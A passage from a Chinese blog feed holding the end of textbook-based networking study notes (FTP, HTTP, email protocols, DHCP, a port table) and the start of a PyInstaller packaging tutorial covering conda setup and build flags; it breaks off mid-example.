服务器进程可以同时为多个客户进程提供服务。</li><li>（5）FTP 的服务器进程有两大部分：<ul><li>一个主进程，负责接受新的请求；</li><li>若干个从属进程，负责处理单个请求</li></ul></li></ul></li><li>两个连接：<ul><li>控制连接：控制进程</li><li>数据连接：数据传送进程</li></ul></li><li>当客户进程向服务器进程发出建立连接请求时，要寻找连接服务器进程的熟知端口 (21)，同时还要告诉服务器进程自己的另一个端口号码，用于建立数据传送连接。接着，服务器进程用自己传送数据的熟知端口 (20) 与客户进程所提供的端口号码建立数据传送连接。由于 FTP 使用了两个不同的端口号，所以数据连接与控制连接不会发生混乱。</li><li>使用两个不同端口号：<ul><li>使协议更加简单和更容易实现。</li><li>在传输文件时还可以利用控制连接（例如，客户发送请求终止传输）。</li></ul></li></ul><h3 id="6-2-3-简单文件传送协议-TFTP"><a href="#6-2-3-简单文件传送协议-TFTP" class="headerlink" title="6.2.3 简单文件传送协议 TFTP"></a>6.2.3 简单文件传送协议 TFTP</h3><ul><li>TFTP (Trivial File Transfer Protocol) 是一个很小且易于实现的文件传送协议。</li><li>TFTP 使用客户服务器方式和使用 UDP 数据报，因此 TFTP 需要有自己的差错改正措施。</li><li>TFTP 只支持文件传输而不支持交互。</li><li>TFTP 没有一个庞大的命令集，没有列目录的功能，也不能对用户进行身份鉴别。</li><li>特点：<ul><li>（1）每次传送的数据 PDU 中有 512 字节的数据，但最后一次可不足 512 字节。</li><li>（2）数据 PDU 也称为文件块 (block)，每个块按序编号，从 1 开始。</li><li>（3）支持 ASCII 码或二进制传送。</li><li>（4）可对文件进行读或写。</li><li>（5）使用很简单的首部。</li></ul></li><li>TFTP 的工作很像停止等待协议</li></ul><h2 id="6-3-远程终端协议-TELNET"><a href="#6-3-远程终端协议-TELNET" class="headerlink" title="6.3 远程终端协议 TELNET"></a>6.3 远程终端协议 TELNET</h2><ul><li>TELNET 是一个简单的远程终端协议，也是互联网的正式标准。</li><li>用户用 TELNET 就可在其所在地通过 TCP 连接注册（即登录）到远地的另一个主机上（使用主机名或 IP 地址）。</li><li>TELNET 也使用客户服务器方式。在本地系统运行 TELNET 客户进程，而在远地主机则运行 TELNET 服务器进程。</li><li>和 FTP 的情况相似，服务器中的主进程等待新的请求，并产生从属进程来处理每一个连接</li><li>TELNET 使用网络虚拟终端 NVT 格式</li></ul><h2 id="6-4-万维网-WWW"><a href="#6-4-万维网-WWW" class="headerlink" title="6.4 万维网 WWW"></a>6.4 万维网 WWW</h2><h3 id="6-4-1-万维网概述"><a href="#6-4-1-万维网概述" class="headerlink" title="6.4.1 万维网概述"></a>6.4.1 万维网概述</h3><ul><li>万维网 WWW (World Wide Web) 并非某种特殊的计算机网络。</li><li>万维网是一个大规模的、联机式的储藏所。</li><li>万维网用链接的方法能非常方便地从互联网上的一个站点访问另一个站点，从而主动地按需获取丰富的信息。这种访问方式称为“链接”。</li><li>万维网提供分布式服务：</li><li>万维网是分布式超媒体系统，它是超文本系统的扩充。</li><li>一个超文本由多个信息源链接成。利用一个链接可使用户找到另一个文档。这些文档可以位于世界上任何一个接在互联网上的超文本系统中。超文本是万维网的基础。</li><li>超媒体与超文本的区别是文档内容不同。超文本文档仅包含文本信息，而超媒体文档还包含其他表示方式的信息，如图形、图像、声音、动画，甚至活动视频图像。</li><li>万维网的工作方式：<ul><li>（1）万维网以客户 - 服务器方式工作。</li><li>（2）浏览器就是在用户计算机上的万维网客户程序。万维网文档所驻留的计算机则运行服务器程序，因此这个计算机也称为万维网服务器。</li><li>（3）客户程序向服务器程序发出请求，服务器程序向客户程序送回客户所要的文档。</li><li>（4）在一个客户程序主窗口上显示出的万维网文档称为页面。</li></ul></li><li>万维网解决的问题：<ul><li>怎样标志分布在整个互联网上的万维网文档？<ul><li>使用统一资源定位符 URL 来标志万维网上的各种文档。</li><li>使每一个文档在整个互联网的范围内具有唯一的标识符 URL。</li></ul></li><li>用何协议实现万维网上各种超链的链接？<ul><li>在万维网客户程序与万维网服务器程序之间进行交互所使用的协议，是超文本传送协议 HTTP。</li><li>HTTP 是一个应用层协议，它使用 TCP 连接进行可靠的传送。</li></ul></li><li>怎样使各种万维网文档都能在互联网上的各种计算机上显示出来，同时使用户清楚地知道在什么地方存在着超链？<ul><li>超文本标记语言 HTML 使得万维网页面的设计者可以很方便地用一个超链从本页面的某处链接到互联网上的任何一个万维网页面，并且能够在自己的计算机屏幕上将这些页面显示出来。</li></ul></li><li>怎样使用户能够很方便地找到所需的信息？<ul><li>为了在万维网上方便地查找信息，用户可使用各种的搜索工具（即搜索引擎）。</li></ul></li></ul></li></ul><h3 id="6-4-2-统一资源定位符-URL"><a href="#6-4-2-统一资源定位符-URL" class="headerlink" title="6.4.2 统一资源定位符 URL"></a>6.4.2 统一资源定位符 URL</h3><ol><li>URL 的格式：URL 相当于一个文件名在网络范围的扩展<ul><li>字符对大小写无要求</li><li>:// 是格式规定</li><li>&lt; 主机 &gt; 是存放资源的主机在互联网中的域名</li><li>:&lt; 端口 &gt;/ &lt; 路径 &gt;   有时可以省略（http 的默认端口 80）</li></ul></li></ol><h3 id="6-4-3-超文本传送协议-HTTP"><a href="#6-4-3-超文本传送协议-HTTP" class="headerlink" title="6.4.3 超文本传送协议 HTTP"></a>6.4.3 超文本传送协议 HTTP</h3><ol><li>HTTP 的操作过程</li><li><p>HTTP 的主要特点</p><ul><li>HTTP 是面向事务的客户 - 服务器协议</li><li>HTTP 协议是无状态，持续连接的<ul><li>持续连接有两种工作方式：非流水线方式；流水线方式</li></ul></li><li>HTTP 协议本身也是无连接的，他使用了面向连接的 TCP 向上提供的服务</li></ul></li><li><p>代理服务器：</p><ul><li>代理服务器 (proxy server) 又称为万维网高速缓存 (Web cache)，它代表浏览器发出 HTTP 请求。</li><li>万维网高速缓存把最近的一些请求和响应暂存在本地磁盘中。</li><li>当与暂时存放的请求相同的新请求到达时，万维网高速缓存就把暂存的响应发送出去，而不需要按 URL 的地址再去互联网访问该资源</li><li>使用高速缓存可以减少访问互联网服务器的时延</li></ul></li><li><p>HTTP 的报文结构：</p><ul><li>HTTP 有两种报文：请求报文和响应报文</li><li>HTTP 是面向正文的，因此在报文中的每一个字段都是一些 ASCll 码串</li><li>报文由三个部分组成，即开始行、首部行和实体主体。</li><li>在请求报文中，开始行就是请求行。</li><li>“方法”是面向对象技术中使用的专门名词。所谓“方法”就是对所请求的对象进行的操作，因此这些方法实际上也就是一些命令。因此，请求报文的类型是由它所采用的方法决定的。</li><li>在响应报文中，开始行就是状态行</li><li>状态行包括三项内容，即 HTTP 的版本、状态码，以及解释状态码的简单短语。</li><li>状态码都是三位数字：<ul><li>1xx 表示通知信息的，如请求收到了或正在进行处理。</li><li>2xx 表示成功，如接受或知道了。</li><li>3xx 表示重定向，表示要完成请求还必须采取进一步的行动。</li><li>4xx 表示客户的差错，如请求中有错误的语法或不能完成。</li><li>5xx 表示服务器的差错，如服务器失效无法完成请求。</li></ul></li><li>在服务器上存放用户的信息<ul><li>万维网站点使用 Cookie 来跟踪用户。</li><li>Cookie 表示在 HTTP 服务器和客户之间传递的状态信息。</li><li>使用 Cookie 的网站服务器为用户产生一个唯一的识别码。利用此识别码，网站就能够跟踪该用户在该网站的活动。</li></ul></li></ul></li></ol><h3 id="6-4-4-万维网的文档"><a href="#6-4-4-万维网的文档" class="headerlink" title="6.4.4 万维网的文档"></a>6.4.4 万维网的文档</h3><ol><li><p>超文本标记语言 HTML</p><ul><li>超文本标记语言 HTML 中的 Markup 的意思就是“设置标记”。</li><li>HTML 定义了许多用于排版的命令（即标签）。</li><li>HTML 把各种标签嵌入到万维网的页面中。这样就构成了所谓的 HTML 文档。HTML 文档是一种可以用任何文本编辑器创建的 ASCII 码文件。</li><li>仅当 HTML 文档是以 .html 或 .htm 为后缀时，浏览器才对此文档的各种标签进行解释</li><li>HTML 还规定了链接的设置方法。每个链接都有一个起点和终点。</li><li>远程链接：超链的终点是其他网点上的页面。</li><li>本地链接：超链指向本计算机中的某个文件</li><li>XML：</li><li>XML (Extensible Markup Language) 是可扩展标记语言，它和 HTML 很相似。</li><li>但 XML 的设计宗旨是传输数据，而不是显示数据（HTML 是为了在浏览器上显示数据）。</li><li>XML 不是要替换 HTML，而是对 HTML 的补充</li><li>XHTML：是可扩展超文本标记语言，是更为严格的 HTML 版本</li><li>CSS 是层叠样式表，用于为 HTML 文档定义布局。<ul><li>CSS 与 HTML 的区别就是：HTML 用于结构化内容，而 CSS 则用于格式化结构化的内容</li></ul></li></ul></li><li><p>动态万维网文档：</p><ul><li>静态文档是指该文档创作完毕后就存放在万维网服务器中，在被用户浏览的过程中，内容不会改变。</li><li>动态文档是指文档的内容是在浏览器访问万维网服务器时才由应用程序动态创建。</li><li>动态文档和静态文档之间的主要差别体现在服务器一端。这主要是文档内容的生成方法不同。而从浏览器的角度看，这两种文档并没有区别。</li><li>通关网关接口 CGI：<ul><li>定义了动态文档应如何创建，输入数据应如何提供给应用程序，以及输出结果应如何使用</li><li>CGI 程序的正式名字是 CGI 脚本 (script) 或 cgi-bin 脚本。</li><li>“脚本”指的是一个程序，它被另一个程序（解释程序）而不是计算机的处理机来解释或执行。</li><li>脚本运行起来要比一般的编译程序要慢，因为它的每一条指令先要被另一个程序来处理（这就要一些附加的指令），而不是直接被指令处理器来处理。</li></ul></li></ul></li></ol><hr><h2 id="6-5-电子邮件"><a href="#6-5-电子邮件" class="headerlink" title="6.5 电子邮件"></a>6.5 电子邮件</h2><h3 id="6-5-1-电子邮件概述"><a href="#6-5-1-电子邮件概述" class="headerlink" title="6.5.1 电子邮件概述"></a>6.5.1 电子邮件概述</h3><ul><li><strong>电子邮件</strong> (e-mail) 是互联网上使用得最多的和最受用户欢迎的一种应用。</li><li>电子邮件把邮件发送到收件人使用的邮件服务器，并放在其中的收件人<strong>邮箱</strong>中，收件人可随时上网到自己使用的邮件服务器进行读取。</li><li>传递迅速，费用低廉。</li><li>发送邮件的协议：<strong>简单邮件传送协议 SMTP</strong>（7位ASCII码邮件）<br>读取邮件的协议：<strong>邮局协议POP3</strong> 和 <strong>IMAP</strong></li><li><strong>通用互联网邮件扩充MIME</strong> 在其邮件首部中说明了邮件的数据类型（如文本、声音、图像、视像等），使用 MIME 可在邮件中同时传送多种类型的数据。</li></ul><h4 id="电子邮件系统组成构件："><a href="#电子邮件系统组成构件：" class="headerlink" title="电子邮件系统组成构件："></a>电子邮件系统组成构件：</h4><ul><li><strong>用户代理</strong></li><li><strong>邮件服务器</strong></li><li><strong>邮件发送协议 &amp; 邮件读取协议</strong></li></ul><h4 id="用户代理-UA（电子邮件客户端软件）："><a href="#用户代理-UA（电子邮件客户端软件）：" class="headerlink" title="用户代理 UA（电子邮件客户端软件）："></a>用户代理 UA（电子邮件客户端软件）：</h4><ul><li>功能：<strong>撰写，显示，处理，通信</strong></li><li>邮件服务器按照<strong>客户-服务器方式</strong>工作</li></ul><h4 id="电子邮件组成："><a href="#电子邮件组成：" class="headerlink" title="电子邮件组成："></a>电子邮件组成：</h4><ul><li><strong>信封</strong></li><li><strong>内容</strong></li></ul><h4 id="电子邮件地址格式："><a href="#电子邮件地址格式：" class="headerlink" title="电子邮件地址格式："></a>电子邮件地址格式：</h4><p>收件人邮箱名@邮箱所在主机的域名</p><ul><li>符号“@”读作“at”，表示“在”的意思。</li></ul><hr><h3 id="6-5-2-简单邮件传送协议-SMTP"><a href="#6-5-2-简单邮件传送协议-SMTP" class="headerlink" title="6.5.2 简单邮件传送协议 SMTP"></a>6.5.2 简单邮件传送协议 SMTP</h3><ul><li>SMTP 规定了两个相互通信的 SMTP 进程之间如何交换信息。</li><li>SMTP 使用<strong>客户-服务器方式</strong>，发送方为 SMTP 客户，接收方为 SMTP 服务器。</li><li>SMTP 规定了 14 条命令和 21 种应答信息。</li></ul><h4 id="SMTP通信的三个阶段："><a href="#SMTP通信的三个阶段：" class="headerlink" title="SMTP通信的三个阶段："></a>SMTP通信的三个阶段：</h4><ol><li><strong>连接建立</strong>：SMTP 不使用中间的邮件服务器</li><li><strong>邮件传送</strong></li><li><strong>连接释放</strong>：邮件发送完毕，SMTP 应释放 TCP 连接</li></ol><hr><h3 id="6-5-3-电子邮件的信息格式"><a href="#6-5-3-电子邮件的信息格式" class="headerlink" title="6.5.3 电子邮件的信息格式"></a>6.5.3 电子邮件的信息格式</h3><ul><li>一个电子邮件分为<strong>信封</strong>和<strong>内容</strong>两大部分。</li><li>RFC 822 规定了邮件内容中<strong>首部</strong>(header) 格式，主体(body)部分由用户自由撰写。</li><li>邮件内容首部关键字：<ul><li><strong>To</strong>：收件人地址</li><li><strong>Subject</strong>：主题</li><li><strong>Cc</strong>：抄送</li><li><strong>Bcc</strong>：盲抄送（暗送）</li><li><strong>From</strong>：发件人地址</li><li><strong>Date</strong>：发信日期</li></ul></li></ul><hr><h3 id="6-5-4-邮件读取协议-POP3-和-IMAP"><a href="#6-5-4-邮件读取协议-POP3-和-IMAP" class="headerlink" title="6.5.4 邮件读取协议 POP3 和 IMAP"></a>6.5.4 邮件读取协议 POP3 和 IMAP</h3><ul><li><strong>POP3</strong>：邮局协议，使用 C/S 方式，简单、离线读取</li><li><strong>IMAP</strong>：网际报文存取协议，使用 C/S 方式，支持在线操作、多文件夹管理</li></ul><hr><h3 id="6-5-5-基于万维网的电子邮件"><a href="#6-5-5-基于万维网的电子邮件" class="headerlink" title="6.5.5 基于万维网的电子邮件"></a>6.5.5 基于万维网的电子邮件</h3><ul><li>浏览器与邮件服务器之间使用 <strong>HTTP 协议</strong>。</li><li>邮件服务器之间使用 <strong>SMTP 协议</strong>。</li></ul><hr><h2 id="6-6-动态主机配置协议-DHCP"><a href="#6-6-动态主机配置协议-DHCP" class="headerlink" title="6.6 动态主机配置协议 DHCP"></a>6.6 动态主机配置协议 DHCP</h2><ul><li>DHCP 提供<strong>即插即用连网</strong>机制。</li><li>主机启动时广播发送 DHCP 发现报文。</li><li>DHCP 服务器回应提供报文。</li><li>可使用 <strong>DHCP 中继代理</strong> 实现跨网段分配。</li></ul><hr><h2 id="附录：常用协议与端口对照表（部分）"><a href="#附录：常用协议与端口对照表（部分）" class="headerlink" title="附录：常用协议与端口对照表（部分）"></a>附录：常用协议与端口对照表（部分）</h2><div class="table-container"><table><thead><tr><th>协议</th><th>端口号</th><th>描述</th></tr></thead><tbody><tr><td>FTP</td><td>20/21</td><td>数据/控制连接</td></tr><tr><td>SSH</td><td>22</td><td>安全远程登录</td></tr><tr><td>TELNET</td><td>23</td><td>远程终端</td></tr><tr><td>SMTP</td><td>25</td><td>邮件发送</td></tr><tr><td>DNS</td><td>53</td><td>域名解析</td></tr><tr><td>HTTP</td><td>80</td><td>万维网服务</td></tr><tr><td>POP3</td><td>110</td><td>邮件接收</td></tr><tr><td>IMAP</td><td>143</td><td>邮件接收（高级）</td></tr><tr><td>HTTPS</td><td>443</td><td>加密的万维网服务</td></tr><tr><td>DHCP</td><td>67/68</td><td>服务器/客户端端口</td></tr></tbody></table></div><hr><h2 id="总结：网络层次与协议对应关系"><a href="#总结：网络层次与协议对应关系" class="headerlink" title="总结：网络层次与协议对应关系"></a>总结：网络层次与协议对应关系</h2><div class="table-container"><table><thead><tr><th>OSI 七层模型</th><th>TCP/IP 四层模型</th><th>主要协议</th></tr></thead><tbody><tr><td>应用层</td><td>应用层</td><td>HTTP、FTP、SMTP、DNS、DHCP</td></tr><tr><td>表示层</td><td>（合并）</td><td>SSL/TLS、MIME</td></tr><tr><td>会话层</td><td></td><td></td></tr><tr><td>运输层</td><td>运输层</td><td>TCP、UDP</td></tr><tr><td>网络层</td><td>网际层</td><td>IP、ICMP、ARP、RIP、OSPF</td></tr><tr><td>数据链路层</td><td>网络接口层</td><td>Ethernet、PPP、CSMA/CD</td></tr><tr><td>物理层</td><td></td><td>双绞线、光纤、无线、调制解调</td></tr></tbody></table></div><hr><blockquote><p>📌 <strong>提示</strong>：本笔记基于《计算机网络（第7版）》谢希仁 整理</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python打包教程</title>
      <link href="/posts/d8a26971.html"/>
      <url>/posts/d8a26971.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>最近使用python开发了一个windows桌面应用，本篇博客就用来总结python打包的相关知识，同时简说开发。本文将记录笔者使用pyinstaller踩的所有坑。</p></blockquote><h2 id="一、环境准备（开发）"><a href="#一、环境准备（开发）" class="headerlink" title="一、环境准备（开发）"></a>一、环境准备（开发）</h2><blockquote><p>如果你已经开发完了只想打包，可以跳过此步骤。</p></blockquote><p>开发一个项目通常需要使用到虚拟环境，这是为了防止在开发过程中面临环境冲突、环境污染的情况。<br>这里使用conda来创建虚拟环境。<a href="https://docs.conda.io/projects/conda/en/latest/user-guide/install/index.html">conda下载</a><br>conda有conda和miniconda，两者功能一样，但miniconda更小，速度更快。这里笔者使用的是miniconda。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ conda <span class="built_in">env</span> list  <span class="comment"># 查看所有虚拟环境</span></span><br><span class="line">$ conda init powershell  <span class="comment"># 初始化shell环境(windows powershell)</span></span><br><span class="line">$ conda activate your_envs  <span class="comment"># 激活虚拟环境,your_envs为你要激活的虚拟环境名</span></span><br><span class="line">$ conda create -n your_envs python=3.11  <span class="comment"># 创建一个python3.11的虚拟环境</span></span><br></pre></td></tr></table></figure><p>第一次使用conda来激活虚拟环境会遇到很多问题，如在初始化shell环境时会遇到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">. : 无法加载文件 D:\win11\Documents\WindowsPowerShell\profile.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 htt</span><br><span class="line">ps:/go.microsoft.com/fwlink/?LinkID=135170 中的 about_Execution_Policies。</span><br><span class="line">所在位置 行:1 字符: 3</span><br><span class="line">+ . &#x27;D:\win11\Documents\WindowsPowerShell\profile.ps1&#x27;</span><br><span class="line">+   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : SecurityError: (:) []，PSSecurityException</span><br><span class="line">    + FullyQualifiedErrorId : UnauthorizedAccess</span><br></pre></td></tr></table></figure><p>这是 <strong>PowerShell 执行策略（Execution Policy）阻止了脚本运行</strong>，导致 conda 的初始化脚本 <code>profile.ps1</code> 无法加载。</p><h3 id="✅-解决方法（只需执行一次）："><a href="#✅-解决方法（只需执行一次）：" class="headerlink" title="✅ 解决方法（只需执行一次）："></a>✅ 解决方法（只需执行一次）：</h3><h4 id="1-打开-PowerShell（管理员模式）"><a href="#1-打开-PowerShell（管理员模式）" class="headerlink" title="1. 打开 PowerShell（管理员模式）"></a>1. 打开 PowerShell（管理员模式）</h4><ul><li><strong>Win + X</strong> → 选择 <strong>“Windows PowerShell（管理员）”</strong></li></ul><h4 id="2-运行以下命令，允许当前用户运行本地脚本："><a href="#2-运行以下命令，允许当前用户运行本地脚本：" class="headerlink" title="2. 运行以下命令，允许当前用户运行本地脚本："></a>2. 运行以下命令，允许当前用户运行本地脚本：</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> <span class="literal">-Scope</span> CurrentUser RemoteSigned</span><br></pre></td></tr></table></figure><h4 id="3-按提示输入-Y-或-A-确认即可。"><a href="#3-按提示输入-Y-或-A-确认即可。" class="headerlink" title="3. 按提示输入 Y 或 A 确认即可。"></a>3. 按提示输入 <code>Y</code> 或 <code>A</code> 确认即可。</h4><h3 id="✅-完成后："><a href="#✅-完成后：" class="headerlink" title="✅ 完成后："></a>✅ 完成后：</h3><p>关闭 PowerShell，重新打开一个 <strong>普通 PowerShell 窗口</strong>（非管理员），然后运行：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda activate 你的环境名</span><br></pre></td></tr></table></figure><br>应该就能正常使用了。</p><h3 id="🔍-补充说明："><a href="#🔍-补充说明：" class="headerlink" title="🔍 补充说明："></a>🔍 补充说明：</h3><ul><li><code>RemoteSigned</code> 是较安全的策略，允许运行本地脚本，但远程下载的脚本需要签名。</li><li>如果你不想改策略，也可以每次手动运行：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; <span class="string">&#x27;D:\win11\Documents\WindowsPowerShell\profile.ps1&#x27;</span></span><br></pre></td></tr></table></figure>但这不是推荐方式。</li></ul><p>虚拟环境激活后，整个项目就在这个环境中开发（这很重要，开发过程中要时刻清除你到底是用的哪个环境来开发的,环境弄错了后面可能会产生麻烦的后果）。</p><hr><h2 id="二、安装pyinstaller"><a href="#二、安装pyinstaller" class="headerlink" title="二、安装pyinstaller"></a>二、安装pyinstaller</h2><p>然后是安装pyinstaller，这是python的打包工具，用来将python项目打包成exe文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ conda activate your_envs  <span class="comment"># 激活虚拟环境</span></span><br><span class="line">$ pip install pyinstaller   <span class="comment"># 安装pyinstaller包</span></span><br></pre></td></tr></table></figure><blockquote><p>如果不是虚拟环境，自行省略虚拟环境的部分，包括后面的。</p></blockquote><p>或者使用离线安装，安装方式：</p><p>在 <a href="https://github.com/pyinstaller/pyinstaller/releases">Pyinstaller离线包链接</a> 中选择最新版win64位的下载即可，然后安装方式同上：先激活你的虚拟环境，然后 <code>pip install</code> 把你刚下载好的离线文件拖到这个pip install 后面回车即可。</p><hr><h2 id="三、Pyinstaller-生成exe（程序无传参版）"><a href="#三、Pyinstaller-生成exe（程序无传参版）" class="headerlink" title="三、Pyinstaller 生成exe（程序无传参版）"></a>三、Pyinstaller 生成exe（程序无传参版）</h2><p>Pyinstaller的语法在Windows，MacOS和Ubuntu的语法相同，但是在Windows下打包的应用只能在Windows下使用，MacOS和Ubuntu同理。</p><h3 id="简易版"><a href="#简易版" class="headerlink" title="简易版"></a>简易版</h3><p>首先我们有一个写好的脚本<code>test.py</code>，然后打包指令为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pyinstaller -F test.py</span><br></pre></td></tr></table></figure><p>会在你的python根下生成一个 <strong>build</strong> 和 <strong>dist</strong> 文件夹还有一个 <strong>spec</strong> 文件，你生成的exe就在<code>dist</code>里边。双击即可运行。</p><h3 id="进阶版"><a href="#进阶版" class="headerlink" title="进阶版"></a>进阶版</h3><p>下面来看一下pyinstaller的参数</p><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>-h</td><td>该模块的help信息</td></tr><tr><td>-F</td><td>生成一个可执行文件</td></tr><tr><td>-D</td><td>生成一个目录（包含多个文件）作为可执行文件</td></tr><tr><td>-w</td><td>运行exe时，不显示命令行窗口（仅对Windows有效）</td></tr><tr><td>-i</td><td>该参数后跟可执行文件的icon图标路径</td></tr><tr><td>—distpath</td><td>该参数后跟可执行文件的路径</td></tr><tr><td>-n</td><td>该参数后跟可执行文件的新名字</td></tr></tbody></table></div><blockquote><p>详细参数说明请查看：<a href="https://github.com/muziing/pyinstaller-docs-zh-cn?tab=readme-ov-file">PyInstaller 中文文档</a></p></blockquote><p>笔者这次开发用的生成指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ pyinstaller --onedir --contents-directory . -w ^</span><br><span class="line">  --add-data <span class="string">&quot;resources;resources&quot;</span> ^</span><br><span class="line">  --add-data <span class="string">&quot;mathjax;mathjax&quot;</span> ^</span><br><span class="line">  --hidden-import=PyQt5.sip ^</span><br><span class="line">  -i resources/logo.ico ^</span><br><span class="line">  --name Cheqory main_control.py</span><br></pre></td></tr></table></figure><p>参数解释：<br>| 参数 | 说明 |<br>| —— | —— |<br>| <code>--onedir</code> | 生成包含所有依赖的文件夹（默认打包方式，与<code>-D</code>等效） |<br>| <code>--contents-directory .</code> | 输出格式保留源文件结构（Pyinstaller&gt;=6.0.0） |<br>| <code>-w</code> | 创建Windows窗口化程序（不显示控制台，GUI模式） |<br>| <code>--add-data &quot;resources;resources&quot;</code> | 添加资源文件夹（格式为”源路径;目标路径”，Windows使用分号分隔） |<br>| <code>--hidden-import=PyQt5.sip</code> | 显式包含PyQt5的sip模块（自动检测可能遗漏的依赖） |<br>| <code>-i logo.ico</code> | 设置应用程序图标（需提前准备.ico格式文件） |<br>| <code>--add-data &quot;mathjax;mathjax&quot;</code> | 添加数学公式渲染所需的MathJax库 |<br>| <code>--version-file file_version_info.txt</code> | 注入Windows可执行文件版本信息（需单独编写版本文件） |<br>| <code>--name Cheqory</code> | 指定生成的可执行文件名称（默认与主脚本同名） |<br>| <code>main_control.py</code> | 应用程序入口文件（主程序脚本） |</p><hr><h2 id="四、Pyinstaller-生成exe（程序带参数版）"><a href="#四、Pyinstaller-生成exe（程序带参数版）" class="headerlink" title="四、Pyinstaller 生成exe（程序带参数版）"></a>四、Pyinstaller 生成exe（程序带参数版）</h2><p>相信写好的脚本都有 <strong>输入</strong> 和 <strong>输出</strong>，那么现在分两种方法进行介绍：</p><h3 id="相对路径传参"><a href="#相对路径传参" class="headerlink" title="相对路径传参"></a>相对路径传参</h3><p>首先在python脚本中获取当前文件路径，然后倒推同根下或者上一级文件，前提是首先把你的输入路径写死，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">project</span><br><span class="line">｜---- test.exe</span><br><span class="line">｜---- input_dir</span><br><span class="line">｜---- output_dir</span><br></pre></td></tr></table></figure><p>那么你的python就可以通过 <code>os.getcwd()</code> 获取project的路径，然后向子路径寻找你的input；或者通过 <code>os.path.dirname(os.path.abspath(__file__))</code> 来获取project的路径，然后告诉你的小姐姐说：你的文件都要放在这个input下才行～</p><p>然后：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pyinstaller -F test.py</span><br></pre></td></tr></table></figure><h3 id="指定路径传参"><a href="#指定路径传参" class="headerlink" title="指定路径传参"></a>指定路径传参</h3><p>指定路径通过<code>sys.argv[]</code>来传递<code>test.py</code>的参数，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># test.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a, b</span>):</span><br><span class="line">    c = a + b</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    add(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br></pre></td></tr></table></figure><p>在终端运行时使用 <code>python test.py 1 2</code> 即可。</p><p>然后：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pyinstaller -F test.py</span><br></pre></td></tr></table></figure><p>继续：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> 你的test.exe路径下</span><br><span class="line">$ test.exe 1 2</span><br></pre></td></tr></table></figure><p>这样即可通过指定参数完成传递。</p><hr><h2 id="五、Pyinstaller打包多个py文件为一个exe文件"><a href="#五、Pyinstaller打包多个py文件为一个exe文件" class="headerlink" title="五、Pyinstaller打包多个py文件为一个exe文件"></a>五、Pyinstaller打包多个py文件为一个exe文件</h2><p>打包的文件可能包含多个py脚本和一些其他类型文件，如xml, ui, pth等等。因为需要调用的文件较多， <strong>建议将所有的非py脚本放在根目录下新建文件夹中去调用，所有的py脚本放在根目录下</strong>，这样看起来会十分的整洁，笔者亲身经历。前提要保证放在文件夹中的非py文件可以正确被调用哦。直接上栗子🌰：</p><p>你的目录长这个样子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">project</span><br><span class="line">｜---- test.py</span><br><span class="line">｜---- func1.py</span><br><span class="line">｜---- func2.py</span><br><span class="line">｜---- dir</span><br><span class="line">       ｜------ file</span><br><span class="line"></span><br><span class="line"># test.py为你要封装的文件，func1.py和func2.py为test.py需要调用的py脚本，dir中的文件为py脚本需要调用的非py类文件</span><br></pre></td></tr></table></figure><p>你需要这样运行即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span 